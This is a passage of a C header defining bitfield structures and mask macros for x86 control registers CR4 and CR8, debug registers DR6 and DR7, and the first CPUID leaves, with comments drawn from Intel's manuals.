#define CR4_DEBUGGING_EXTENSIONS_BIT                                 3
#define CR4_DEBUGGING_EXTENSIONS_FLAG                                0x08
#define CR4_DEBUGGING_EXTENSIONS_MASK                                0x01
#define CR4_DEBUGGING_EXTENSIONS(_)                                  (((_) >> 3) & 0x01)

        /**
         * @brief Page Size Extensions
         *
         * [Bit 4] Enables 4-MByte pages with 32-bit paging when set; restricts 32-bit paging to pages of 4 KBytes when clear.
         *
         * @see Vol3A[4.3(32-BIT PAGING)]
         */
        UINT64 PageSizeExtensions : 1;
#define CR4_PAGE_SIZE_EXTENSIONS_BIT                                 4
#define CR4_PAGE_SIZE_EXTENSIONS_FLAG                                0x10
#define CR4_PAGE_SIZE_EXTENSIONS_MASK                                0x01
#define CR4_PAGE_SIZE_EXTENSIONS(_)                                  (((_) >> 4) & 0x01)

        /**
         * @brief Physical Address Extension
         *
         * [Bit 5] When set, enables paging to produce physical addresses with more than 32 bits. When clear, restricts physical
         * addresses to 32 bits. PAE must be set before entering IA-32e mode.
         *
         * @see Vol3A[4(PAGING)]
         */
        UINT64 PhysicalAddressExtension : 1;
#define CR4_PHYSICAL_ADDRESS_EXTENSION_BIT                           5
#define CR4_PHYSICAL_ADDRESS_EXTENSION_FLAG                          0x20
#define CR4_PHYSICAL_ADDRESS_EXTENSION_MASK                          0x01
#define CR4_PHYSICAL_ADDRESS_EXTENSION(_)                            (((_) >> 5) & 0x01)

        /**
         * @brief Machine-Check Enable
         *
         * [Bit 6] Enables the machine-check exception when set; disables the machine-check exception when clear.
         *
         * @see Vol3B[15(MACHINE-CHECK ARCHITECTURE)]
         */
        UINT64 MachineCheckEnable : 1;
#define CR4_MACHINE_CHECK_ENABLE_BIT                                 6
#define CR4_MACHINE_CHECK_ENABLE_FLAG                                0x40
#define CR4_MACHINE_CHECK_ENABLE_MASK                                0x01
#define CR4_MACHINE_CHECK_ENABLE(_)                                  (((_) >> 6) & 0x01)

        /**
         * @brief Page Global Enable
         *
         * [Bit 7] (Introduced in the P6 family processors.) Enables the global page feature when set; disables the global page
         * feature when clear. The global page feature allows frequently used or shared pages to be marked as global to all users
         * (done with the global flag, bit 8, in a page-directory or page-table entry). Global pages are not flushed from the
         * translation-lookaside buffer (TLB) on a task switch or a write to register CR3. When enabling the global page feature,
         * paging must be enabled (by setting the PG flag in control register CR0) before the PGE flag is set. Reversing this
         * sequence may affect program correctness, and processor performance will be impacted.
         *
         * @see Vol3A[4.10(CACHING TRANSLATION INFORMATION)]
         */
        UINT64 PageGlobalEnable : 1;
#define CR4_PAGE_GLOBAL_ENABLE_BIT                                   7
#define CR4_PAGE_GLOBAL_ENABLE_FLAG                                  0x80
#define CR4_PAGE_GLOBAL_ENABLE_MASK                                  0x01
#define CR4_PAGE_GLOBAL_ENABLE(_)                                    (((_) >> 7) & 0x01)

        /**
         * @brief Performance-Monitoring Counter Enable
         *
         * [Bit 8] Enables execution of the RDPMC instruction for programs or procedures running at any protection level when set;
         * RDPMC instruction can be executed only at protection level 0 when clear.
         */
        UINT64 PerformanceMonitoringCounterEnable : 1;
#define CR4_PERFORMANCE_MONITORING_COUNTER_ENABLE_BIT                8
#define CR4_PERFORMANCE_MONITORING_COUNTER_ENABLE_FLAG               0x100
#define CR4_PERFORMANCE_MONITORING_COUNTER_ENABLE_MASK               0x01
#define CR4_PERFORMANCE_MONITORING_COUNTER_ENABLE(_)                 (((_) >> 8) & 0x01)

        /**
         * @brief Operating System Support for FXSAVE and FXRSTOR instructions
         *
         * [Bit 9] When set, this flag:
         * -# indicates to software that the operating system supports the use of the FXSAVE and FXRSTOR instructions,
         * -# enables the FXSAVE and FXRSTOR instructions to save and restore the contents of the XMM and MXCSR registers along
         * with the contents of the x87 FPU and MMX registers, and
         * -# enables the processor to execute SSE/SSE2/SSE3/SSSE3/SSE4 instructions, with the exception of the PAUSE, PREFETCHh,
         * SFENCE, LFENCE, MFENCE, MOVNTI, CLFLUSH, CRC32, and POPCNT.
         * If this flag is clear, the FXSAVE and FXRSTOR instructions will save and restore the contents of the x87 FPU and MMX
         * registers, but they may not save and restore the contents of the XMM and MXCSR registers. Also, the processor will
         * generate an invalid opcode exception (\#UD) if it attempts to execute any SSE/SSE2/SSE3 instruction, with the exception
         * of PAUSE, PREFETCHh, SFENCE, LFENCE, MFENCE, MOVNTI, CLFLUSH, CRC32, and POPCNT. The operating system or executive must
         * explicitly set this flag.
         *
         * @remarks CPUID feature flag FXSR indicates availability of the FXSAVE/FXRSTOR instructions. The OSFXSR bit provides
         *          operating system software with a means of enabling FXSAVE/FXRSTOR to save/restore the contents of the X87 FPU, XMM and
         *          MXCSR registers. Consequently OSFXSR bit indicates that the operating system provides context switch support for
         *          SSE/SSE2/SSE3/SSSE3/SSE4.
         */
        UINT64 OsFxsaveFxrstorSupport : 1;
#define CR4_OS_FXSAVE_FXRSTOR_SUPPORT_BIT                            9
#define CR4_OS_FXSAVE_FXRSTOR_SUPPORT_FLAG                           0x200
#define CR4_OS_FXSAVE_FXRSTOR_SUPPORT_MASK                           0x01
#define CR4_OS_FXSAVE_FXRSTOR_SUPPORT(_)                             (((_) >> 9) & 0x01)

        /**
         * @brief Operating System Support for Unmasked SIMD Floating-Point Exceptions
         *
         * [Bit 10] Operating System Support for Unmasked SIMD Floating-Point Exceptions - When set, indicates that the operating
         * system supports the handling of unmasked SIMD floating-point exceptions through an exception handler that is invoked
         * when a SIMD floating-point exception (\#XM) is generated. SIMD floating-point exceptions are only generated by
         * SSE/SSE2/SSE3/SSE4.1 SIMD floatingpoint instructions.
         * The operating system or executive must explicitly set this flag. If this flag is not set, the processor will generate an
         * invalid opcode exception (\#UD) whenever it detects an unmasked SIMD floating-point exception.
         */
        UINT64 OsXmmExceptionSupport : 1;
#define CR4_OS_XMM_EXCEPTION_SUPPORT_BIT                             10
#define CR4_OS_XMM_EXCEPTION_SUPPORT_FLAG                            0x400
#define CR4_OS_XMM_EXCEPTION_SUPPORT_MASK                            0x01
#define CR4_OS_XMM_EXCEPTION_SUPPORT(_)                              (((_) >> 10) & 0x01)

        /**
         * @brief User-Mode Instruction Prevention
         *
         * [Bit 11] When set, the following instructions cannot be executed if CPL > 0: SGDT, SIDT, SLDT, SMSW, and STR. An attempt
         * at such execution causes a generalprotection exception (\#GP).
         */
        UINT64 UsermodeInstructionPrevention : 1;
#define CR4_USERMODE_INSTRUCTION_PREVENTION_BIT                      11
#define CR4_USERMODE_INSTRUCTION_PREVENTION_FLAG                     0x800
#define CR4_USERMODE_INSTRUCTION_PREVENTION_MASK                     0x01
#define CR4_USERMODE_INSTRUCTION_PREVENTION(_)                       (((_) >> 11) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * @brief VMX-Enable
         *
         * [Bit 13] Enables VMX operation when set.
         *
         * @see Vol3C[23(INTRODUCTION TO VIRTUAL MACHINE EXTENSIONS)]
         */
        UINT64 VmxEnable : 1;
#define CR4_VMX_ENABLE_BIT                                           13
#define CR4_VMX_ENABLE_FLAG                                          0x2000
#define CR4_VMX_ENABLE_MASK                                          0x01
#define CR4_VMX_ENABLE(_)                                            (((_) >> 13) & 0x01)

        /**
         * @brief SMX-Enable
         *
         * [Bit 14] Enables SMX operation when set.
         *
         * @see Vol2[6(SAFER MODE EXTENSIONS REFERENCE)]
         */
        UINT64 SmxEnable : 1;
#define CR4_SMX_ENABLE_BIT                                           14
#define CR4_SMX_ENABLE_FLAG                                          0x4000
#define CR4_SMX_ENABLE_MASK                                          0x01
#define CR4_SMX_ENABLE(_)                                            (((_) >> 14) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * @brief FSGSBASE-Enable
         *
         * [Bit 16] Enables the instructions RDFSBASE, RDGSBASE, WRFSBASE, and WRGSBASE.
         */
        UINT64 FsgsbaseEnable : 1;
#define CR4_FSGSBASE_ENABLE_BIT                                      16
#define CR4_FSGSBASE_ENABLE_FLAG                                     0x10000
#define CR4_FSGSBASE_ENABLE_MASK                                     0x01
#define CR4_FSGSBASE_ENABLE(_)                                       (((_) >> 16) & 0x01)

        /**
         * @brief PCID-Enable
         *
         * [Bit 17] Enables process-context identifiers (PCIDs) when set. Can be set only in IA-32e mode (if IA32_EFER.LMA = 1).
         *
         * @see Vol3A[4.10.1(Process-Context Identifiers (PCIDs))]
         */
        UINT64 PcidEnable : 1;
#define CR4_PCID_ENABLE_BIT                                          17
#define CR4_PCID_ENABLE_FLAG                                         0x20000
#define CR4_PCID_ENABLE_MASK                                         0x01
#define CR4_PCID_ENABLE(_)                                           (((_) >> 17) & 0x01)

        /**
         * @brief XSAVE and Processor Extended States-Enable
         *
         * [Bit 18] When set, this flag:
         * -# indicates (via CPUID.01H:ECX.OSXSAVE[bit 27]) that the operating system supports the use of the XGETBV, XSAVE and
         * XRSTOR instructions by general software;
         * -# enables the XSAVE and XRSTOR instructions to save and restore the x87 FPU state (including MMX registers), the SSE
         * state (XMM registers and MXCSR), along with other processor extended states enabled in XCR0;
         * -# enables the processor to execute XGETBV and XSETBV instructions in order to read and write XCR0.
         *
         * @see Vol3A[2.6(EXTENDED CONTROL REGISTERS (INCLUDING XCR0))]
         * @see Vol3A[13(SYSTEM PROGRAMMING FOR INSTRUCTION SET EXTENSIONS AND PROCESSOR EXTENDED)]
         */
        UINT64 OsXsave : 1;
#define CR4_OS_XSAVE_BIT                                             18
#define CR4_OS_XSAVE_FLAG                                            0x40000
#define CR4_OS_XSAVE_MASK                                            0x01
#define CR4_OS_XSAVE(_)                                              (((_) >> 18) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * @brief SMEP-Enable
         *
         * [Bit 20] Enables supervisor-mode execution prevention (SMEP) when set.
         *
         * @see Vol3A[4.6(ACCESS RIGHTS)]
         */
        UINT64 SmepEnable : 1;
#define CR4_SMEP_ENABLE_BIT                                          20
#define CR4_SMEP_ENABLE_FLAG                                         0x100000
#define CR4_SMEP_ENABLE_MASK                                         0x01
#define CR4_SMEP_ENABLE(_)                                           (((_) >> 20) & 0x01)

        /**
         * @brief SMAP-Enable
         *
         * [Bit 21] Enables supervisor-mode access prevention (SMAP) when set.
         *
         * @see Vol3A[4.6(ACCESS RIGHTS)]
         */
        UINT64 SmapEnable : 1;
#define CR4_SMAP_ENABLE_BIT                                          21
#define CR4_SMAP_ENABLE_FLAG                                         0x200000
#define CR4_SMAP_ENABLE_MASK                                         0x01
#define CR4_SMAP_ENABLE(_)                                           (((_) >> 21) & 0x01)

        /**
         * @brief Protection-Key-Enable
         *
         * [Bit 22] Enables 4-level paging to associate each linear address with a protection key. The PKRU register specifies, for
         * each protection key, whether user-mode linear addresses with that protection key can be read or written. This bit also
         * enables access to the PKRU register using the RDPKRU and WRPKRU instructions.
         */
        UINT64 ProtectionKeyEnable : 1;
#define CR4_PROTECTION_KEY_ENABLE_BIT                                22
#define CR4_PROTECTION_KEY_ENABLE_FLAG                               0x400000
#define CR4_PROTECTION_KEY_ENABLE_MASK                               0x01
#define CR4_PROTECTION_KEY_ENABLE(_)                                 (((_) >> 22) & 0x01)
        UINT64 Reserved4 : 41;
    };

    UINT64 Flags;
} CR4;

typedef union
{
    struct
    {
        /**
         * @brief Task Priority Level
         *
         * [Bits 3:0] This sets the threshold value corresponding to the highestpriority interrupt to be blocked. A value of 0
         * means all interrupts are enabled. This field is available in 64- bit mode. A value of 15 means all interrupts will be
         * disabled.
         */
        UINT64 TaskPriorityLevel : 4;
#define CR8_TASK_PRIORITY_LEVEL_BIT                                  0
#define CR8_TASK_PRIORITY_LEVEL_FLAG                                 0x0F
#define CR8_TASK_PRIORITY_LEVEL_MASK                                 0x0F
#define CR8_TASK_PRIORITY_LEVEL(_)                                   (((_) >> 0) & 0x0F)

        /**
         * @brief Reserved
         *
         * [Bits 63:4] Reserved and must be written with zeros. Failure to do this causes a general-protection exception.
         */
        UINT64 Reserved : 60;
#define CR8_RESERVED_BIT                                             4
#define CR8_RESERVED_FLAG                                            0xFFFFFFFFFFFFFFF0
#define CR8_RESERVED_MASK                                            0xFFFFFFFFFFFFFFF
#define CR8_RESERVED(_)                                              (((_) >> 4) & 0xFFFFFFFFFFFFFFF)
    };

    UINT64 Flags;
} CR8;

/**
 * @}
 */

 /**
  * @defgroup DEBUG_REGISTERS \
  *           Debug registers
  *
  * Eight debug registers control the debug operation of the processor. These registers can be written to and read using the
  * move to/from debug register form of the MOV instruction. A debug register may be the source or destination operand for
  * one of these instructions.
  * Debug registers are privileged resources; a MOV instruction that accesses these registers can only be executed in
  * real-address mode, in SMM or in protected mode at a CPL of 0. An attempt to read or write the debug registers from any
  * other privilege level generates a general-protection exception (\#GP). The primary function of the debug registers is to
  * set up and monitor from 1 to 4 breakpoints, numbered 0 though 3. For each breakpoint, the following information can be
  * specified:
  * - The linear address where the breakpoint is to occur.
  * - The length of the breakpoint location: 1, 2, 4, or 8 bytes.
  * - The operation that must be performed at the address for a debug exception to be generated.
  * - Whether the breakpoint is enabled.
  * - Whether the breakpoint condition was present when the debug exception was generated.
  *
  * @see Vol3B[17.2.4(Debug Control Register (DR7))]
  * @see Vol3B[17.2(DEBUG REGISTERS)] (reference)
  * @{
  */
typedef union
{
    struct
    {
        /**
         * @brief B0 through B3 (breakpoint condition detected) flags
         *
         * [Bits 3:0] Indicates (when set) that its associated breakpoint condition was met when a debug exception was generated.
         * These flags are set if the condition described for each breakpoint by the LENn, and R/Wn flags in debug control register
         * DR7 is true. They may or may not be set if the breakpoint is not enabled by the Ln or the Gn flags in register DR7.
         * Therefore on a \#DB, a debug handler should check only those B0-B3 bits which correspond to an enabled breakpoint.
         */
        UINT64 BreakpointCondition : 4;
#define DR6_BREAKPOINT_CONDITION_BIT                                 0
#define DR6_BREAKPOINT_CONDITION_FLAG                                0x0F
#define DR6_BREAKPOINT_CONDITION_MASK                                0x0F
#define DR6_BREAKPOINT_CONDITION(_)                                  (((_) >> 0) & 0x0F)
        UINT64 Reserved1 : 9;

        /**
         * @brief BD (debug register access detected) flag
         *
         * [Bit 13] Indicates that the next instruction in the instruction stream accesses one of the debug registers (DR0 through
         * DR7). This flag is enabled when the GD (general detect) flag in debug control register DR7 is set.
         *
         * @see Vol3B[17.2.4(Debug Control Register (DR7))]
         */
        UINT64 DebugRegisterAccessDetected : 1;
#define DR6_DEBUG_REGISTER_ACCESS_DETECTED_BIT                       13
#define DR6_DEBUG_REGISTER_ACCESS_DETECTED_FLAG                      0x2000
#define DR6_DEBUG_REGISTER_ACCESS_DETECTED_MASK                      0x01
#define DR6_DEBUG_REGISTER_ACCESS_DETECTED(_)                        (((_) >> 13) & 0x01)

        /**
         * @brief BS (single step) flag
         *
         * [Bit 14] Indicates (when set) that the debug exception was triggered by the singlestep execution mode (enabled with the
         * TF flag in the EFLAGS register). The single-step mode is the highestpriority debug exception. When the BS flag is set,
         * any of the other debug status bits also may be set.
         */
        UINT64 SingleInstruction : 1;
#define DR6_SINGLE_INSTRUCTION_BIT                                   14
#define DR6_SINGLE_INSTRUCTION_FLAG                                  0x4000
#define DR6_SINGLE_INSTRUCTION_MASK                                  0x01
#define DR6_SINGLE_INSTRUCTION(_)                                    (((_) >> 14) & 0x01)

        /**
         * @brief BT (task switch) flag
         *
         * [Bit 15] Indicates (when set) that the debug exception was triggered by the singlestep execution mode (enabled with the
         * TF flag in the EFLAGS register). The single-step mode is the highestpriority debug exception. When the BS flag is set,
         * any of the other debug status bits also may be set.
         */
        UINT64 TaskSwitch : 1;
#define DR6_TASK_SWITCH_BIT                                          15
#define DR6_TASK_SWITCH_FLAG                                         0x8000
#define DR6_TASK_SWITCH_MASK                                         0x01
#define DR6_TASK_SWITCH(_)                                           (((_) >> 15) & 0x01)

        /**
         * @brief RTM (restricted transactional memory) flag
         *
         * [Bit 16] Indicates (when clear) that a debug exception (\#DB) or breakpoint exception (\#BP) occurred inside an RTM
         * region while advanced debugging of RTM transactional regions was enabled. This bit is set for any other debug exception
         * (including all those that occur when advanced debugging of RTM transactional regions is not enabled). This bit is always
         * 1 if the processor does not support RTM.
         *
         * @see Vol3B[17.3.3(Debug Exceptions, Breakpoint Exceptions, and Restricted Transactional Memory (RTM))]
         */
        UINT64 RestrictedTransactionalMemory : 1;
#define DR6_RESTRICTED_TRANSACTIONAL_MEMORY_BIT                      16
#define DR6_RESTRICTED_TRANSACTIONAL_MEMORY_FLAG                     0x10000
#define DR6_RESTRICTED_TRANSACTIONAL_MEMORY_MASK                     0x01
#define DR6_RESTRICTED_TRANSACTIONAL_MEMORY(_)                       (((_) >> 16) & 0x01)
        UINT64 Reserved2 : 47;
    };

    UINT64 Flags;
} DR6;

typedef union
{
    struct
    {
        /**
         * @brief L0 through L3 (local breakpoint enable) flags (bits 0, 2, 4, and 6)
         *
         * [Bit 0] Enables (when set) the breakpoint condition for the associated breakpoint for the current task. When a
         * breakpoint condition is detected and its associated Ln flag is set, a debug exception is generated. The processor
         * automatically clears these flags on every task switch to avoid unwanted breakpoint conditions in the new task.
         */
        UINT64 LocalBreakpoint0 : 1;
#define DR7_LOCAL_BREAKPOINT_0_BIT                                   0
#define DR7_LOCAL_BREAKPOINT_0_FLAG                                  0x01
#define DR7_LOCAL_BREAKPOINT_0_MASK                                  0x01
#define DR7_LOCAL_BREAKPOINT_0(_)                                    (((_) >> 0) & 0x01)

        /**
         * @brief G0 through G3 (global breakpoint enable) flags (bits 1, 3, 5, and 7)
         *
         * [Bit 1] Enables (when set) the breakpoint condition for the associated breakpoint for all tasks. When a breakpoint
         * condition is detected and its associated Gn flag is set, a debug exception is generated. The processor does not clear
         * these flags on a task switch, allowing a breakpoint to be enabled for all tasks.
         */
        UINT64 GlobalBreakpoint0 : 1;
#define DR7_GLOBAL_BREAKPOINT_0_BIT                                  1
#define DR7_GLOBAL_BREAKPOINT_0_FLAG                                 0x02
#define DR7_GLOBAL_BREAKPOINT_0_MASK                                 0x01
#define DR7_GLOBAL_BREAKPOINT_0(_)                                   (((_) >> 1) & 0x01)
        UINT64 LocalBreakpoint1 : 1;
#define DR7_LOCAL_BREAKPOINT_1_BIT                                   2
#define DR7_LOCAL_BREAKPOINT_1_FLAG                                  0x04
#define DR7_LOCAL_BREAKPOINT_1_MASK                                  0x01
#define DR7_LOCAL_BREAKPOINT_1(_)                                    (((_) >> 2) & 0x01)
        UINT64 GlobalBreakpoint1 : 1;
#define DR7_GLOBAL_BREAKPOINT_1_BIT                                  3
#define DR7_GLOBAL_BREAKPOINT_1_FLAG                                 0x08
#define DR7_GLOBAL_BREAKPOINT_1_MASK                                 0x01
#define DR7_GLOBAL_BREAKPOINT_1(_)                                   (((_) >> 3) & 0x01)
        UINT64 LocalBreakpoint2 : 1;
#define DR7_LOCAL_BREAKPOINT_2_BIT                                   4
#define DR7_LOCAL_BREAKPOINT_2_FLAG                                  0x10
#define DR7_LOCAL_BREAKPOINT_2_MASK                                  0x01
#define DR7_LOCAL_BREAKPOINT_2(_)                                    (((_) >> 4) & 0x01)
        UINT64 GlobalBreakpoint2 : 1;
#define DR7_GLOBAL_BREAKPOINT_2_BIT                                  5
#define DR7_GLOBAL_BREAKPOINT_2_FLAG                                 0x20
#define DR7_GLOBAL_BREAKPOINT_2_MASK                                 0x01
#define DR7_GLOBAL_BREAKPOINT_2(_)                                   (((_) >> 5) & 0x01)
        UINT64 LocalBreakpoint3 : 1;
#define DR7_LOCAL_BREAKPOINT_3_BIT                                   6
#define DR7_LOCAL_BREAKPOINT_3_FLAG                                  0x40
#define DR7_LOCAL_BREAKPOINT_3_MASK                                  0x01
#define DR7_LOCAL_BREAKPOINT_3(_)                                    (((_) >> 6) & 0x01)
        UINT64 GlobalBreakpoint3 : 1;
#define DR7_GLOBAL_BREAKPOINT_3_BIT                                  7
#define DR7_GLOBAL_BREAKPOINT_3_FLAG                                 0x80
#define DR7_GLOBAL_BREAKPOINT_3_MASK                                 0x01
#define DR7_GLOBAL_BREAKPOINT_3(_)                                   (((_) >> 7) & 0x01)

        /**
         * @brief LE (local exact breakpoint enable)
         *
         * [Bit 8] This feature is not supported in the P6 family processors, later IA-32 processors, and Intel 64 processors. When
         * set, these flags cause the processor to detect the exact instruction that caused a data breakpoint condition. For
         * backward and forward compatibility with other Intel processors, we recommend that the LE and GE flags be set to 1 if
         * exact breakpoints are required.
         */
        UINT64 LocalExactBreakpoint : 1;
#define DR7_LOCAL_EXACT_BREAKPOINT_BIT                               8
#define DR7_LOCAL_EXACT_BREAKPOINT_FLAG                              0x100
#define DR7_LOCAL_EXACT_BREAKPOINT_MASK                              0x01
#define DR7_LOCAL_EXACT_BREAKPOINT(_)                                (((_) >> 8) & 0x01)
        UINT64 GlobalExactBreakpoint : 1;
#define DR7_GLOBAL_EXACT_BREAKPOINT_BIT                              9
#define DR7_GLOBAL_EXACT_BREAKPOINT_FLAG                             0x200
#define DR7_GLOBAL_EXACT_BREAKPOINT_MASK                             0x01
#define DR7_GLOBAL_EXACT_BREAKPOINT(_)                               (((_) >> 9) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * @brief RTM (restricted transactional memory) flag
         *
         * [Bit 11] Enables (when set) advanced debugging of RTM transactional regions. This advanced debugging is enabled only if
         * IA32_DEBUGCTL.RTM is also set.
         *
         * @see Vol3B[17.3.3(Debug Exceptions, Breakpoint Exceptions, and Restricted Transactional Memory (RTM))]
         */
        UINT64 RestrictedTransactionalMemory : 1;
#define DR7_RESTRICTED_TRANSACTIONAL_MEMORY_BIT                      11
#define DR7_RESTRICTED_TRANSACTIONAL_MEMORY_FLAG                     0x800
#define DR7_RESTRICTED_TRANSACTIONAL_MEMORY_MASK                     0x01
#define DR7_RESTRICTED_TRANSACTIONAL_MEMORY(_)                       (((_) >> 11) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * @brief GD (general detect enable) flag
         *
         * [Bit 13] Enables (when set) debug-register protection, which causes a debug exception to be generated prior to any MOV
         * instruction that accesses a debug register. When such a condition is detected, the BD flag in debug status register DR6
         * is set prior to generating the exception. This condition is provided to support in-circuit emulators.
         * When the emulator needs to access the debug registers, emulator software can set the GD flag to prevent interference
         * from the program currently executing on the processor.
         * The processor clears the GD flag upon entering to the debug exception handler, to allow the handler access to the debug
         * registers.
         */
        UINT64 GeneralDetect : 1;
#define DR7_GENERAL_DETECT_BIT                                       13
#define DR7_GENERAL_DETECT_FLAG                                      0x2000
#define DR7_GENERAL_DETECT_MASK                                      0x01
#define DR7_GENERAL_DETECT(_)                                        (((_) >> 13) & 0x01)
        UINT64 Reserved3 : 2;

        /**
         * @brief R/W0 through R/W3 (read/write) fields (bits 16, 17, 20, 21, 24, 25, 28, and 29)
         *
         * [Bits 17:16] Specifies the breakpoint condition for the corresponding breakpoint. The DE (debug extensions) flag in
         * control register CR4 determines how the bits in the R/Wn fields are interpreted. When the DE flag is set, the processor
         * interprets bits as follows:
         * - 00 - Break on instruction execution only.
         * - 01 - Break on data writes only.
         * - 10 - Break on I/O reads or writes.
         * - 11 - Break on data reads or writes but not instruction fetches.
         * When the DE flag is clear, the processor interprets the R/Wn bits the same as for the Intel386(TM) and Intel486(TM)
         * processors, which is as follows:
         * - 00 - Break on instruction execution only.
         * - 01 - Break on data writes only.
         * - 10 - Undefined.
         * - 11 - Break on data reads or writes but not instruction fetches.
         */
        UINT64 ReadWrite0 : 2;
#define DR7_READ_WRITE_0_BIT                                         16
#define DR7_READ_WRITE_0_FLAG                                        0x30000
#define DR7_READ_WRITE_0_MASK                                        0x03
#define DR7_READ_WRITE_0(_)                                          (((_) >> 16) & 0x03)

        /**
         * @brief LEN0 through LEN3 (Length) fields (bits 18, 19, 22, 23, 26, 27, 30, and 31)
         *
         * [Bits 19:18] Specify the size of the memory location at the address specified in the corresponding breakpoint address
         * register (DR0 through DR3). These fields are interpreted as follows:
         * - 00 - 1-byte length.
         * - 01 - 2-byte length.
         * - 10 - Undefined (or 8 byte length, see note below).
         * - 11 - 4-byte length.
         * If the corresponding RWn field in register DR7 is 00 (instruction execution), then the LENn field should also be 00. The
         * effect of using other lengths is undefined.
         *
         * @see Vol3B[17.2.5(Breakpoint Field Recognition)]
         */
        UINT64 Length0 : 2;
#define DR7_LENGTH_0_BIT                                             18
#define DR7_LENGTH_0_FLAG                                            0xC0000
#define DR7_LENGTH_0_MASK                                            0x03
#define DR7_LENGTH_0(_)                                              (((_) >> 18) & 0x03)
        UINT64 ReadWrite1 : 2;
#define DR7_READ_WRITE_1_BIT                                         20
#define DR7_READ_WRITE_1_FLAG                                        0x300000
#define DR7_READ_WRITE_1_MASK                                        0x03
#define DR7_READ_WRITE_1(_)                                          (((_) >> 20) & 0x03)
        UINT64 Length1 : 2;
#define DR7_LENGTH_1_BIT                                             22
#define DR7_LENGTH_1_FLAG                                            0xC00000
#define DR7_LENGTH_1_MASK                                            0x03
#define DR7_LENGTH_1(_)                                              (((_) >> 22) & 0x03)
        UINT64 ReadWrite2 : 2;
#define DR7_READ_WRITE_2_BIT                                         24
#define DR7_READ_WRITE_2_FLAG                                        0x3000000
#define DR7_READ_WRITE_2_MASK                                        0x03
#define DR7_READ_WRITE_2(_)                                          (((_) >> 24) & 0x03)
        UINT64 Length2 : 2;
#define DR7_LENGTH_2_BIT                                             26
#define DR7_LENGTH_2_FLAG                                            0xC000000
#define DR7_LENGTH_2_MASK                                            0x03
#define DR7_LENGTH_2(_)                                              (((_) >> 26) & 0x03)
        UINT64 ReadWrite3 : 2;
#define DR7_READ_WRITE_3_BIT                                         28
#define DR7_READ_WRITE_3_FLAG                                        0x30000000
#define DR7_READ_WRITE_3_MASK                                        0x03
#define DR7_READ_WRITE_3(_)                                          (((_) >> 28) & 0x03)
        UINT64 Length3 : 2;
#define DR7_LENGTH_3_BIT                                             30
#define DR7_LENGTH_3_FLAG                                            0xC0000000
#define DR7_LENGTH_3_MASK                                            0x03
#define DR7_LENGTH_3(_)                                              (((_) >> 30) & 0x03)
        UINT64 Reserved4 : 32;
    };

    UINT64 Flags;
} DR7;

/**
 * @}
 */

 /**
  * @defgroup CPUID \
  *           CPUID
  *
  * @see Vol2A[3.2(CPUID)] (reference)
  * @{
  */
  /**
   * @brief Returns CPUID's Highest Value for Basic Processor Information and the Vendor Identification String
   *
   * When CPUID executes with EAX set to 0, the processor returns the highest value the CPUID recognizes for returning basic
   * processor information. The value is returned in the EAX register and is processor specific.
   * A vendor identification string is also returned in EBX, EDX, and ECX. For Intel processors, the string is "GenuineIntel"
   * and is expressed:
   * - EBX <- 756e6547h (* "Genu", with G in the low eight bits of BL *)
   * - EDX <- 49656e69h (* "ineI", with i in the low eight bits of DL *)
   * - ECX <- 6c65746eh (* "ntel", with n in the low eight bits of CL *)
   */
#define CPUID_SIGNATURE                                              0x00000000
typedef struct
{
    /**
     * @brief EAX
     *
     * Maximum Input Value for Basic CPUID Information.
     */
    UINT32 MaxCpuidInputValue;

    /**
     * @brief EBX
     *
     * "Genu"
     */
    UINT32 EbxValueGenu;

    /**
     * @brief ECX
     *
     * "ntel"
     */
    UINT32 EcxValueNtel;

    /**
     * @brief EDX
     *
     * "ineI"
     */
    UINT32 EdxValueInei;
} CPUID_EAX_00;


/**
 * @brief Returns Model, Family, Stepping Information, Additional Information and Feature Information
 *
 * Returns:
 *   * Model, Family, Stepping Information in EAX
 *   * Additional Information in EBX
 *   * Feature Information in ECX and EDX
 */
#define CPUID_VERSION_INFORMATION                                    0x00000001
typedef struct
{
    /**
     * @brief When CPUID executes with EAX set to 01H, version information is returned in EAX
     */
    union
    {
        struct
        {
            UINT32 SteppingId : 4;
#define CPUID_VERSION_INFORMATION_STEPPING_ID_BIT                    0
#define CPUID_VERSION_INFORMATION_STEPPING_ID_FLAG                   0x0F
#define CPUID_VERSION_INFORMATION_STEPPING_ID_MASK                   0x0F
#define CPUID_VERSION_INFORMATION_STEPPING_ID(_)                     (((_) >> 0) & 0x0F)
            UINT32 Model : 4;
#define CPUID_VERSION_INFORMATION_MODEL_BIT                          4
#define CPUID_VERSION_INFORMATION_MODEL_FLAG                         0xF0
#define CPUID_VERSION_INFORMATION_MODEL_MASK                         0x0F
#define CPUID_VERSION_INFORMATION_MODEL(_)                           (((_) >> 4) & 0x0F)
            UINT32 FamilyId : 4;
#define CPUID_VERSION_INFORMATION_FAMILY_ID_BIT                      8
#define CPUID_VERSION_INFORMATION_FAMILY_ID_FLAG                     0xF00
#define CPUID_VERSION_INFORMATION_FAMILY_ID_MASK                     0x0F
#define CPUID_VERSION_INFORMATION_FAMILY_ID(_)                       (((_) >> 8) & 0x0F)

            /**
             * [Bits 13:12] - 0 - Original OEM Processor
             * - 1 - Intel OverDrive(R) Processor
             * - 2 - Dual processor (not applicable to Intel486 processors)
             * - 3 - Intel reserved
             */
            UINT32 ProcessorType : 2;
#define CPUID_VERSION_INFORMATION_PROCESSOR_TYPE_BIT                 12
#define CPUID_VERSION_INFORMATION_PROCESSOR_TYPE_FLAG                0x3000
#define CPUID_VERSION_INFORMATION_PROCESSOR_TYPE_MASK                0x03
#define CPUID_VERSION_INFORMATION_PROCESSOR_TYPE(_)                  (((_) >> 12) & 0x03)
            UINT32 Reserved1 : 2;

            /**
             * [Bits 19:16] The Extended Model ID needs to be examined only when the Family ID is 06H or 0FH.
             */
            UINT32 ExtendedModelId : 4;
#define CPUID_VERSION_INFORMATION_EXTENDED_MODEL_ID_BIT              16
#define CPUID_VERSION_INFORMATION_EXTENDED_MODEL_ID_FLAG             0xF0000
#define CPUID_VERSION_INFORMATION_EXTENDED_MODEL_ID_MASK             0x0F
#define CPUID_VERSION_INFORMATION_EXTENDED_MODEL_ID(_)               (((_) >> 16) & 0x0F)

            /**
             * [Bits 27:20] The Extended Family ID needs to be examined only when the Family ID is 0FH.
             */
            UINT32 ExtendedFamilyId : 8;
#define CPUID_VERSION_INFORMATION_EXTENDED_FAMILY_ID_BIT             20
